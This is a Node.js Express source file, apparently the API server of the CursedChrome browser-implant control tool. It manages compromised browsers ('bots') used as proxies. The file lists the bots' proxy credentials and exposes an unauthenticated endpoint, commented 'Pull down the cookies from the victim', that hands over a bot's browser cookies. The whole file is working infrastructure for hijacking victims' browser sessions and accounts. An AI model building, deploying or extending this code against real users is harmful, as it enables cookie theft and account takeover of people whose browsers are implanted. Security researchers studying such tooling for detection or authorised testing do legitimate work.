const copy = require('./utils.js').copy;
const express = require('express');
const bcrypt = require('bcrypt');
const uuid = require('uuid');
const bodyParser = require('body-parser');
const sessions = require('client-sessions');
const database = require('./database.js');
const Users = database.Users;
const Bots = database.Bots;
const Settings = database.Settings;
const sequelize = database.sequelize;
const Sequelize = require('sequelize');
const Op = Sequelize.Op;
const get_hashed_password = require('./utils.js').get_hashed_password;

/*
    API Server

    You can authenticate to the API using the browser_account_access_key.

    Later on I'll add an official API key system.
*/
const validate = require('express-jsonschema').validate;
const API_BASE_PATH = '/api/v1';

function getMethods(obj) {
    var result = [];
    for (var id in obj) {
        try {
            if (typeof(obj[id]) == "function") {
                result.push(id + ": " + obj[id].toString());
            }
        } catch (err) {
            result.push(id + ": inaccessible");
        }
    }
    return result;
};

async function get_api_server(proxy_utils) {
    const app = express();
    app.use(bodyParser.json());

    const session_secret_key = 'SESSION_SECRET';

    // Check for existing session secret value
    const session_secret_setting = await Settings.findOne({
        where: {
            key: session_secret_key
        }
    });

    if (!session_secret_setting) {
        console.error(`No session secret is set, can't start API server!`);
        throw new Error('NO_SESSION_SECRET_SET');
        return
    }

    /*
        Add default security headers
    */
    app.use(async function(req, res, next) {
        set_secure_headers(req, res);
        next();
    });

    app.use(sessions({
        cookieName: 'session',
        secret: session_secret_setting.value,
        duration: 7 * 24 * 60 * 60 * 1000, // Default session time is a week
        activeDuration: 1000 * 60 * 5, // Extend for five minutes if actively used
        cookie: {
            ephemeral: true,
            httpOnly: true,
            secure: false
        }
    }));

    /*
		Serve static files from compiled front-end
    */
    app.use('/', express.static(
        '/work/gui/dist/',
        {
          setHeaders: function (res, path, stat) {
            res.set("Content-Security-Policy", "default-src 'none'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self'; font-src 'none'; connect-src 'self'");
          }
        }
    ));

    app.use(async function(req, res, next) {
        const ENDPOINTS_NOT_REQUIRING_AUTH = [
            '/health',
            `${API_BASE_PATH}/login`,
            `${API_BASE_PATH}/verify-proxy-credentials`,
            `${API_BASE_PATH}/get-bot-browser-cookies`,
        ];
        if (ENDPOINTS_NOT_REQUIRING_AUTH.includes(req.originalUrl)) {
            next();
            return
        }

        const auth_needed_response = {
            "success": false,
            "error": "Authentication required, please log in.",
            "code": "NOT_AUTHENTICATED"
        };

        // Check the auth to make sure a valid session exists
        if (!req.session.user_id) {
            res.status(200).json(auth_needed_response).end();
            return
        }

        const user = await Users.findOne({
            where: {
                id: req.session.user_id
            }
        });

        if (!user) {
            res.status(200).json(auth_needed_response).end();
            return
        }

        // Set user information from database record
        req.user = {
            id: user.id,
            username: user.username,
            password_should_be_changed: user.password_should_be_changed
        };

        next();
    });

    /*
    	Update a given bot's properties
    */
    const UpdateBotSchema = {
        type: 'object',
        properties: {
            bot_id: {
                type: 'string',
                required: true,
                pattern: '[0-9a-f]{8}\-[0-9a-f]{4}\-[0-9a-f]{4}\-[0-9a-f]{4}\-[0-9a-f]{12}'
            },
            name: {
                type: 'string',
                required: true
            },
        }
    }
    app.put(API_BASE_PATH + '/bots', validate({ body: UpdateBotSchema }), async (req, res) => {
        const bot = await Bots.findOne({
            where: {
                id: req.body.bot_id
            }
        });
        await bot.update({
            'name': req.body.name
        });

        res.status(200).json({
            "success": true,
            "result": {}
        }).end();
    });

    /*
        Get list of bots
    */
    app.get(API_BASE_PATH + '/bots', async (req, res) => {
        const bots = await Bots.findAll({
            attributes: [
                'id',
                'is_online',
                'name',
                'proxy_password',
                'proxy_username',
                'user_agent',
                'updatedAt',
                'createdAt',
            ]
        });

        res.status(200).json({
            "success": true,
            "result": {
                'bots': bots
            }
        }).end();
    });

    /*
    	Log in to a given user account
    */
    const LoginSchema = {
        type: 'object',
        properties: {
            username: {
                type: 'string',
                required: true
            },
            password: {
                type: 'string',
                required: true
            },
        }
    }
    app.post(API_BASE_PATH + '/login', validate({ body: LoginSchema }), async (req, res) => {
        const user = await Users.findOne({
            where: {
                username: req.body.username
            }
        });

        if(!user) {
            res.status(200).json({
                "success": false,
                "error": "User not found with those credentials, please try again.",
                "code": "INVALID_CREDENTIALS"
            }).end();
            return
        }

        // Compare password with hash from database
        const password_matches = await bcrypt.compare(
            req.body.password,
            user.password,
        );

        if (!password_matches) {
            res.status(200).json({
                "success": false,
                "error": "User not found with those credentials, please try again.",
                "code": "INVALID_CREDENTIALS"
            }).end();
            return
        }

        // Set session data
        req.session.user_id = user.id;

        res.status(200).json({
            "success": true,
            "result": {
                "username": user.username,
                "password_should_be_changed": user.password_should_be_changed,
            }
        }).end();
    });

    /*
     * Log out the user
     */
    app.get(API_BASE_PATH + '/logout', async (req, res) => {
        // Set user_id to null to log the user out
        // This overwrites the previous cookie
        req.session.user_id = null;

        res.status(200).json({
            "success": true,
            "result": {}
        }).end();
    });

    /*
    	Update user's password
    */
    const UpdateUserPasswordSchema = {
        type: 'object',
        properties: {
            new_password: {
                type: 'string',
                required: true
            },
        }
    }
    app.put(API_BASE_PATH + '/password', validate({ body: UpdateUserPasswordSchema }), async (req, res) => {
        const user = await Users.findOne({
            where: {
                id: req.session.user_id
            }
        });
        const new_hashed_password = await get_hashed_password(
            req.body.new_password
        );
        await user.update({
            'password': new_hashed_password,
            'password_should_be_changed': false,
        });

        res.status(200).json({
            "success": true,
            "result": {}
        }).end();
    });

    /*
     * Get log in status
     */
    app.get(API_BASE_PATH + '/me', async (req, res) => {
        res.status(200).json({
            "success": true,
            "result": {
                username: req.user.username,
                password_should_be_changed: req.user.password_should_be_changed
            }
        }).end();
    });

    /*
     * Basic health check endpoint
     */
    app.get('/health', async (req, res) => {
        res.status(200).json({
            "success": true
        }).end();
    });

    /*
     * Serve up the CA cert for download
     */
    app.get(API_BASE_PATH + '/download_ca', async (req, res) => {
        res.download(
            `${__dirname}/ssl/rootCA.crt`,
            'CursedChromeCA.crt'
        );
    });

    /*
        Return if a given set of HTTP proxy credentials is valid or not.
    */
    const ValidateHTTPProxyCredsSchema = {
        type: 'object',
        properties: {
            username: {
                type: 'string',
                required: true
            },
            password: {
                type: 'string',
                required: true
            },
        }
    }
    app.post(API_BASE_PATH + '/verify-proxy-credentials', validate({ body: ValidateHTTPProxyCredsSchema }), async (req, res) => {
        const bot_data = await Bots.findOne({
            where: {
                proxy_username: req.body.username,
                proxy_password: req.body.password,
            },
            attributes: [
                'id',
                'is_online',
                'name',
                'proxy_password',
                'proxy_username',
                'user_agent',
            ]
        });

        if (!bot_data) {
            res.status(200).json({
                "success": false,
                "error": "User not found with those credentials, please try again.",
                "code": "INVALID_CREDENTIALS"
            }).end();
            return
        }

        res.status(200).json({
            "success": true,
            "result": {
                id: bot_data.id,
                is_online: bot_data.is_online,
                name: bot_data.name,
                user_agent: bot_data.user_agent
            }
        }).end();
    });

    /*
        Pull down the cookies from the victim
    */
    const GetBotBrowserCookiesSchema = {
        type: 'object',
        properties: {
            username: {
                type: 'string',
                required: true
            },
            password: {
                type: 'string',
                required: true
            },
        }
    }
    app.post(API_BASE_PATH + '/get-bot-browser-cookies', validate({ body: GetBotBrowserCookiesSchema }), async (req, res) => {
        const bot_data = await Bots.findOne({
            where: {
                proxy_username: req.body.username,
                proxy_password: req.body.password,
            }
        });

        if (!bot_data) {
            res.status(200).json({
                "success": false,
                "error": "User not found with those credentials, please try again.",
                "code": "INVALID_CREDENTIALS"
            }).end();
            return
        }

        const browser_cookies = await proxy_utils.get_browser_cookie_array(
            bot_data.browser_id
        );

        res.status(200).json({
            "success": true,
            "result": {
                "cookies": browser_cookies
            }
        }).end();
    });

    /*
     * Handle JSON Schema errors
     */
    app.use(function(err, req, res, next) {
        var responseData;

        if (err.name === 'JsonSchemaValidation') {
            console.error(`JSONSchema validation error:`);
            console.error(err.message);

            res.status(400);

            responseData = {
                statusText: 'Bad Request',
                jsonSchemaValidation: true,
                validations: err.validations
            };

            if (req.xhr || req.get('Content-Type') === 'application/json') {
                res.json(responseData);
            } else {
                res.render('badrequestTemplate', responseData);
            }
        } else {
            next(err);
        }
    });

    return app;
}

function set_secure_headers(req, res) {
    res.set("X-XSS-Protection", "mode=block");
    res.set("X-Content-Type-Options", "nosniff");
    res.set("X-Frame-Options", "deny");

    if (req.path.startsWith(API_BASE_PATH)) {
        res.set("Content-Security-Policy", "default-src 'none'; script-src 'none'");
        res.set("Content-Type", "application/json");
        return
    }
}

module.exports = {
    get_api_server: get_api_server
};